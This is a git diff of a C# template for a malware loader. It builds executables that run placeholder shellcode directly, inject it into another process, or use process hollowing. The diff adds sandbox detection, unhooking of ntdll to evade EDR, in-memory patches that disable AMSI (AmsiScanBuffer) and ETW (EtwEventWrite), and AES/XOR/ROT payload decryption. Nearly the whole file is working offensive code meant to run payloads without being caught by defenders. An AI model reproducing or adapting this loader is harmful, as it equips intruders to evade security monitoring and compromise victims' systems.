@@ -1,15 +1,106 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+#if AES
+using System.Security.Cryptography;
+#endif
 
 namespace Craft
 {
     public class Program
     {
-        public const uint EXECUTEREADWRITE  = 0x40;
+        public const uint EXECUTEREADWRITE = 0x40;
         public const uint COMMIT_RESERVE = 0x3000;
-        public const uint INFINITE = 0xFFFFFFF;
+        public const uint INFINITE = 0xFFFFFFF;        
+#if RUN
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+#elif INJECT
+        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
+#elif HOLLOW
+        public const uint CREATE_SUSPENDED = 0x4;
+        public const int PROCESSBASICINFORMATION = 0x0;
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfbytesRW);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint ResumeThread(IntPtr hThread);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        public struct ProcessInfo
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public Int32 ProcessId;
+            public Int32 ThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        public struct StartupInfo
+        {
+            public uint cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public uint dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct ProcessBasicInfo
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+#endif
+#if SANDBOX
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
 
@@ -19,35 +110,73 @@ namespace Craft
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr FlsAlloc(IntPtr callback);
 
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern IntPtr LoadLibrary(string lpFileName);
+        private static bool isSandbox()
+        {
+            if (Environment.ProcessorCount < 2)
+            {
+                return true;
+            }
+            if (Process.GetProcesses().Length < 50)
+            {
+                return true;
+            }
+            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, COMMIT_RESERVE, 0x4, 0) == IntPtr.Zero)
+            {
+                return true;
+            }
+            if (FlsAlloc(IntPtr.Zero) == IntPtr.Zero)
+            {
+                return true;
+            }
 
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5)
+            {
+                return true;
+            }
+            return false;
+        }
+#endif
+#if BYPASS
         [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
+        private static bool MemoryPatch(string dllname, string function, byte[] patch)
+        {
+            IntPtr address = GetProcAddress(GetModuleHandle(dllname), function);
+            if (address == IntPtr.Zero)
+            {
+                return false;
+            }
+            uint oldProtect;
+            bool success = VirtualProtect(address, (UIntPtr)patch.Length, EXECUTEREADWRITE, out oldProtect);
+            if (!success)
+            {
+                return false;
+            }
+            Marshal.Copy(patch, 0, address, patch.Length);
+            VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+            return true;
+        }
+#endif
+#if BYPASS || UNHOOK
         [DllImport("kernel32.dll")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+#endif
+#if SANDBOX || UNHOOK
         [DllImport("kernel32.dll")]
-        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-        [DllImport("kernel32.dll")]
-        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
+        public static extern IntPtr GetCurrentProcess();
+#endif
+#if UNHOOK
         [DllImport("psapi.dll", SetLastError = true)]
         public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetCurrentProcess();
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        public static extern IntPtr GetModuleHandle(string lpModuleName);
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
         public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, PageProtection flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
@@ -55,15 +184,9 @@ namespace Craft
         [DllImport("kernel32.dll")]
         public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, FileMapAccessType dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);
 
-        [DllImport("msvcrt.dll", SetLastError = false)]
-        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UInt32 count);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool CloseHandle(IntPtr hObject);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool FreeLibrary(IntPtr hModule);
-
+        [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
+        public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
+        
         public const uint GENERIC_READ = 0x80000000;
         public const uint OPEN_EXISTING = 3;
         public const uint FILE_SHARE_READ = 0x00000001;
@@ -266,36 +389,8 @@ namespace Craft
             public uint SizeOfImage;
             public IntPtr EntryPoint;
         }
-
-        private static bool isSandbox()
-        {
-            if (Environment.ProcessorCount < 2)
-            {
-                return true;
-            }
-            if (Process.GetProcesses().Length < 50)
-            {
-                return true;
-            }
-            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, COMMIT_RESERVE, 0x4, 0) == IntPtr.Zero)
-            {
-                return true;
-            }
-            if (FlsAlloc(IntPtr.Zero) == IntPtr.Zero)
-            {
-                return true;
-            }
-
-            DateTime t1 = DateTime.Now;
-            Sleep(2000);
-            if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5)
-            {
-                return true;
-            }
-            return false;
-        }
-
-        private static void Unhook()
+        
+        private static bool Unhook()
         {
             IntPtr currentProcessHandle = GetCurrentProcess();
             MODULEINFO modInfo = new MODULEINFO();
@@ -323,10 +418,10 @@ namespace Craft
                         uint oldProtect = 0;
                         IntPtr oldAddress = IntPtr.Add(dllBase, (int)sectionHeader.VirtualAddress);
                         IntPtr newAddress = IntPtr.Add(ntdllMmapped, (int)sectionHeader.VirtualAddress);
-                        bool success = VirtualProtect(oldAddress, (UIntPtr)sectionHeader.VirtualSize, 0x40, out oldProtect);
+                        bool success = VirtualProtect(oldAddress, (UIntPtr)sectionHeader.VirtualSize, EXECUTEREADWRITE, out oldProtect);
                         if (success)
                         {
-                            memcpy(oldAddress, newAddress, sectionHeader.VirtualSize);
+                            CopyMemory(oldAddress, newAddress, sectionHeader.VirtualSize);
                             success = VirtualProtect(oldAddress, (UIntPtr)sectionHeader.VirtualSize, oldProtect, out oldProtect);
                         }
                     }
@@ -334,47 +429,100 @@ namespace Craft
             }
             catch (Exception e)
             {
-                return;
-            }
-        }
-
-        private static bool MemoryPatch(string dllname, string function, byte[] patch)
-        {
-            IntPtr address = GetProcAddress(GetModuleHandle(dllname), function);
-            if (address == IntPtr.Zero)
-            {
-                return false;
-            }
-            uint oldProtect;
-            bool success = VirtualProtect(address, (UIntPtr)patch.Length, EXECUTEREADWRITE, out oldProtect);
-            if (success)
-            {
-                Marshal.Copy(patch, 0, address, patch.Length);
-                VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                 return false;
             }
             return true;
         }
 
+#endif
         public static void Main()
         {
+
+#if SANDBOX
             if (isSandbox())
             {
                 return;
             }
-
+#endif
+#if UNHOOK
             Unhook();
-
+#endif
+#if BYPASS
             MemoryPatch("amsi.dll", "AmsiScanBuffer", new byte[] { 0x31, 0xff, 0x90 });
             MemoryPatch("ntdll.dll", "EtwEventWrite", new byte[] { 0xC3 });
+#endif
+            byte[] buf = new byte[] {{SHELLCODE}};
+#if AES
+            byte[] key = new byte[] {{KEY}};
+            byte[] iv = new byte[] {{IV}};
 
-            {{PAYLOAD}}
-        
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = key;
+                aes.IV  = iv;
+                aes.Padding = PaddingMode.PKCS7;
+                using (ICryptoTransform decryptor = aes.CreateDecryptor())
+                {
+                    buf = decryptor.TransformFinalBlock(buf, 0, buf.Length);
+                }
+            }
+#elif XOR
+            for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)((uint)buf[i] ^ {{KEY}});
+            }
+#elif ROT
+            for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)(((uint)buf[i] - {{KEY}}) & 0xFF);
+            }            
+#endif
+#if RUN
             IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
             Marshal.Copy(buf, 0, addr, buf.Length);
-
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
             WaitForSingleObject(hThread, INFINITE);
+#elif INJECT
+            int pid = -1;
+            foreach (var proc in Process.GetProcessesByName("{{PROCESS}}"))
+            {
+                bool isWow64;
+                if (IsWow64Process(proc.Handle, out isWow64) && isWow64 == {{ISWOW64}})
+                {
+                    pid = proc.Id;
+                    break;
+                }
+            }
+            if (pid == -1) {
+                return;
+            }
+            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
+            IntPtr outSize;
+            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+#elif HOLLOW
+            bool isWow64 = {{ISWOW64}};
+            StartupInfo sInfo = new StartupInfo();
+            ProcessInfo pInfo = new ProcessInfo();
+            bool cResult = CreateProcess(null, "{{PROCESS}}", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
+            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
+            uint retLen = new uint();
+            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
+            IntPtr baseImageAddr = isWow64 ? (IntPtr)((Int32)pbInfo.PebAddress + 0x08) : (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
+            byte[] procAddr = new byte[0x8];
+            byte[] dataBuf = new byte[0x400];
+            IntPtr bytesRW = new IntPtr();
+            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
+            IntPtr executableAddress = isWow64 ? (IntPtr)BitConverter.ToInt32(procAddr, 0) : (IntPtr)BitConverter.ToInt64(procAddr, 0);
+            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
+            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3C);
+            uint rvaOffset = e_lfanew + 0x28;
+            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
+            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
+            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
+            uint rResult = ResumeThread(pInfo.hThread);
+#endif
         }
     }
 }
